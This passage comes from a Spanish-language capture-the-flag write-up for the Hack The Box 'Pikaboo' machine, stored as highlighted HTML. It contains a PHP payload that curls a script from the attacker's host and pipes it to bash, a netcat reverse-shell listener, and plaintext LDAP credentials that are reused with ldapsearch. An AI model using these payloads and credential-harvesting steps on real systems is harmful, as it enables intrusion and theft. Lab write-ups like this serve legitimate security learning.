Thu Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 01:53:38 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;pid 6953&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;www-data
www-data&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; FAIL LOGIN: Client &lt;span class=&#34;s2&#34;&gt;&amp;#34;::ffff:10.10.14.24&amp;#34;&lt;/span&gt;
Thu Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 01:53:39 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;pid 6954&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;www-data
www-data&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; FTP response: Client &lt;span class=&#34;s2&#34;&gt;&amp;#34;::ffff:10.10.14.24&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;530 Login incorrect.&amp;#34;&lt;/span&gt;
Thu Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 01:53:39 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;pid 6954&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; FTP command: Client &lt;span class=&#34;s2&#34;&gt;&amp;#34;::ffff:10.10.14.24&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;SYST&amp;#34;&lt;/span&gt;
Thu Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 01:53:39 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;pid 6954&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; FTP response: Client &lt;span class=&#34;s2&#34;&gt;&amp;#34;::ffff:10.10.14.24&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;530 Please login with USER and PASS.&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;www-data---user&#34;&gt;www-data - User&lt;/h1&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://github.com/lukechilds/reverse-shell&#34;&gt;reverse shell as a service&lt;/a&gt; en la version de &lt;a href=&#34;https://shell.infosecjack.me/&#34;&gt;InfosecJack&lt;/a&gt; para generar una shell inversa y en el codigo PHP descargamos y ejecutamos la shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;curl 10.10.14.24/x|bash&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtuvimos una shell con el usuario www-data.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/pikaboo â¯ rlwrap nc -lvp &lt;span class=&#34;m&#34;&gt;1335&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1335&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.24&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from 10.10.10.249 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.249&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;38126&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t access tty; job control turned off
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;www-data@pikaboo:/var/www/html/admin_staging$ which python
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;/usr/bin/python
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;python -c &amp;#39;&lt;/span&gt;import pty&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; pty.spawn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
www-data@pikaboo:/var/www/html/admin_staging$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id
www-data
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
www-data@pikaboo:/var/www/html/admin_staging$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y realizamos la lectura de la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@pikaboo:/var/www$ cat /etc/passwd&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep home
pwnmeow:x:1000:1000:,,,:/home/pwnmeow:/bin/bash
www-data@pikaboo:/var/www$ ls -lah /home/pwnmeow
total 580K
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; pwnmeow pwnmeow  556K Jul  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 20:02 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root    root     4.0K May &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 10:26 ..
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root    root        &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Jul  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 20:02 .bash_history -&amp;gt; /dev/null
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; pwnmeow pwnmeow   &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 10:26 .bash_logout
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; pwnmeow pwnmeow  3.5K May &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 10:26 .bashrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; pwnmeow pwnmeow   &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 10:26 .profile
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root    root        &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Jul  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 20:01 .python_history -&amp;gt; /dev/null
-r--r----- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; pwnmeow www-data   &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 00:40 user.txt
www-data@pikaboo:/var/www$ cat /home/pwnmeow/user.txt
2b4e6a139700d43db0960bfe88fb2d32
www-data@pikaboo:/var/www$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;pwnmeow---ftp&#34;&gt;pwnmeow - FTP&lt;/h1&gt;
&lt;p&gt;Enumerando los directorios vemos la app &lt;code&gt;pokeapi&lt;/code&gt; en &lt;code&gt;/opt&lt;/code&gt; dentro de la configuracion del proyecto encontramos credenciales para LDAP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;DATABASES&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ldap&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ENGINE&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;ldapdb.backends.ldap&amp;#34;&lt;/span&gt;,
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;NAME&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;ldap:///&amp;#34;&lt;/span&gt;,
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;USER&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;cn=binduser,ou=users,dc=pikaboo,dc=htb&amp;#34;&lt;/span&gt;,
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;J~42%W?PFHl]g&amp;#34;&lt;/span&gt;,
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
    &lt;span class=&#34;s2&#34;&gt;&amp;#34;default&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ENGINE&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;django.db.backends.sqlite3&amp;#34;&lt;/span&gt;,
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;NAME&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/opt/pokeapi/db.sqlite3&amp;#34;&lt;/span&gt;,
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tambien observamos que el puerto &lt;code&gt;389&lt;/code&gt; (ldap) esta a la escucha localmente y &lt;code&gt;ldapsearch&lt;/code&gt; esta instalado en la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@pikaboo:/opt/pokeapi/config$ netstat -ntpl
Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:389           0.0.0.0:*               LISTEN      -
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:80              0.0.0.0:*               LISTEN      618/nginx: worker p
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:81            0.0.0.0:*               LISTEN      -
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::80                   :::*                    LISTEN      618/nginx: worker p
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::21                   :::*                    LISTEN      -
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      -
www-data@pikaboo:/opt/pokeapi/config$ which ldapsearch
/usr/bin/ldapsearch
www-data@pikaboo:/opt/pokeapi/config$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtuvimos informacion en LDAP donde observamos la contraseÃ±a de &lt;code&gt;pwnmeow&lt;/code&gt; codificada en base64.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -x -h localhost -D &lt;span class=&#34;s1&#34;&gt;&amp;#39;cn=binduser,ou=users,dc=pikaboo,dc=htb&amp;#39;&lt;/span&gt; -w &lt;span class=&#34;s1&#34;&gt;&amp;#39;J~42%W?PFHl]g&amp;#39;&lt;/span&gt; -b &lt;span class=&#34;s2&#34;&gt;&amp;#34;cn=users,dc=pikaboo,dc=htb&amp;#34;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# extended LDIF&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# LDAPv3&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# base &amp;lt;dc=pikaboo,dc=htb&amp;gt; with scope subtree&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# filter: (objectclass=*)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# requesting: ALL&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
objectClass: domain
dc: pikaboo

&lt;span class=&#34;c1&#34;&gt;# ftp.pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ftp,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
objectClass: domain
dc: ftp

&lt;span class=&#34;c1&#34;&gt;# users, pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;users,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
objectClass: organizationalUnit
objectClass: top
ou: users

&lt;span class=&#34;c1&#34;&gt;# pokeapi.pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pokeapi,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
objectClass: domain
dc: pokeapi

&lt;span class=&#34;c1&#34;&gt;# users, ftp.pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;users,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ftp,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
objectClass: organizationalUnit
objectClass: top
ou: users

&lt;span class=&#34;c1&#34;&gt;# groups, ftp.pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;groups,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ftp,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
objectClass: organizationalUnit
objectClass: top
ou: groups

